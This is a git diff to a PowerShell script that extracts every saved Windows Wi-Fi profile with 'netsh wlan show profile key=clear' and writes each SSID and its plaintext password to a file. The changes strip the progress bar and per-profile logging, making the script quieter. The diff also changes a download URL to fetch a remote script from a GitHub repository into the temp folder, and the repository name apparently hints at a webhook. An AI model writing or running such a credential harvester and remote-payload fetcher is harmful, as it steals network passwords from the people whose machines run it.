@@ -69,15 +69,8 @@ if (-not $profiles) {
     exit 0
 }
 
-# ---------- process profiles with Write-Progress ----------
-$total = $profiles.Count
-$i = 0
+# ---------- process profiles ----------
 foreach ($p in $profiles) {
-    $i++
-    $percent = [int](($i / $total) * 100)
-    Write-Progress -Activity "Extracting WLAN profiles" -Status "Processing..." -PercentComplete $percent
-
-    Write-Log "Processing profile $i of $total $p"
 
     Try {
         $info = netsh wlan show profile name="$p" key=clear 2>$null
@@ -86,20 +79,18 @@ foreach ($p in $profiles) {
     }
 
     $ssidLine = "SSID: $p"
-    $keyLine = $null
-    if ($info) {
-        $keyLine = ($info | Select-String "Key Content" | ForEach-Object {
-            $_.ToString().Split(':',2)[1].Trim()
-        }) -join ''
-    }
+    $keyLine = ($info | Select-String "Key Content" | ForEach-Object {
+        $_.ToString().Split(':',2)[1].Trim()
+    }) -join ''
 
     if (-not $keyLine) {
         $keyLine = "<No password saved or open network>"
     }
 
-    "`n$ssidLine`nPassword: $keyLine`n------------------------" | Out-File -FilePath $outFile -Append -Encoding UTF8
-    Write-Host ("Saved: {0}" -f $p)
+    # Write in clean format without timestamp
+    "SSID: $p`nPASS: $keyLine`n===" | Out-File -FilePath $outFile -Append -Encoding UTF8
 }
+
 
 # clear progress
 Write-Progress -Activity "Extracting WLAN profiles" -Completed
@@ -117,7 +108,7 @@ $footer | Out-File -FilePath $outFile -Append -Encoding UTF8
 Write-Host $footer
 
 # Variables
-$DownloadUrl = "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/refs/heads/main/run.bat"
+$DownloadUrl = "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/refs/heads/main/run.ps1"
 $TempPath = [System.IO.Path]::GetTempPath()
 $FileName = "run.bat"
 $FullPath = Join-Path $TempPath $FileName
